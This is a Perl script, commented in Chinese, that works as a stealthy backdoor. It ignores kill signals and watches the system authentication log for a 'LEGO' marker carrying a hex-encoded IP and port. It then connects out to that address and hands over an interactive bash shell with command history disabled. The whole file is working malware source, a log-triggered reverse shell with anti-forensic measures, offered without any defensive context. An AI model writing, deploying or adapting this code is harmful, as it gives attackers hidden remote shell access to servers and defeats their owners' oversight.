#!/usr/bin/perl
use strict;
use warnings;
use Fcntl qw(:seek);
use IO::Socket::INET;

# 修改信号处理，忽略所有信号
$SIG{INT} = $SIG{TERM} = $SIG{HUP} = 'IGNORE';
$SIG{CHLD} = 'IGNORE';

# 根据系统确定日志文件路径
my $log_file;
if (-f "/var/log/auth.log") {
    $log_file = "/var/log/auth.log";
} elsif (-f "/var/log/secure") {
    $log_file = "/var/log/secure";
} else {
    die "无法找到系统日志文件";
}

# 自定义文件监控
sub monitor_log {
    my $file = shift;
    my $inode = 0;
    my $size = 0;
    my $pos = 0;

    while(1) {
        eval {
            # 检查文件是否存在
            unless(-f $file) {
                sleep(1);
                next;
            }

            # 获取文件信息
            my ($dev, $curr_inode, $mode, $nlink, $uid, $gid, $rdev, $curr_size) = stat($file);

            # 处理文件轮转
            if($curr_inode != $inode) {
                $inode = $curr_inode;
                $pos = 0;
            }

            # 处理文件截断
            if($curr_size < $pos) {
                $pos = 0;
            }

            # 打开文件
            open(my $fh, "<", $file) or next;
            seek($fh, $pos, SEEK_SET);

            # 读取新内容
            while(my $line = <$fh>) {
                if($line =~ /LEGO([a-fA-F0-9]+)/) {
                    my $decoded = pack("H*", $1);
                    # 使用perl直接建立socket连接
                    my ($ip, $port) = $decoded =~ /(\d+\.\d+\.\d+\.\d+)\/(\d+)/;
                    my $sock = IO::Socket::INET->new(
                        PeerAddr => $ip,
                        PeerPort => $port,
                        Proto    => 'tcp'
                    ) or next;
                    
                    # 创建子进程处理连接
                    my $pid = fork();
                    if (not defined $pid) {
                        close($sock);
                        next;
                    }
                    
                    if ($pid == 0) {  # 子进程
                        # 设置进程组，便于清理
                        setpgrp(0, 0);
                        
                        # 重定向标准IO
                        open(STDIN, "<&", $sock);
                        open(STDOUT, ">&", $sock);
                        open(STDERR, ">&", $sock);
                        
                        # 执行shell
                        exec "HISTFILE=/dev/null HISTSIZE=0 /bin/bash -i";
                    }
                    
                    # 父进程只关闭socket，不清理子进程
                    close($sock);
                }
            }

            # 更新位置
            $pos = tell($fh);
            close($fh);

            # 等待文件变化
            sleep(1);
        };
        # 如果发生错误，继续循环
        if ($@) {
            sleep(1);
            next;
        }
    }
}

# 开始监控
while(1) {
    eval {
        monitor_log($log_file);
    };
    # 如果监控函数退出，等待后重新启动
    sleep(1);
}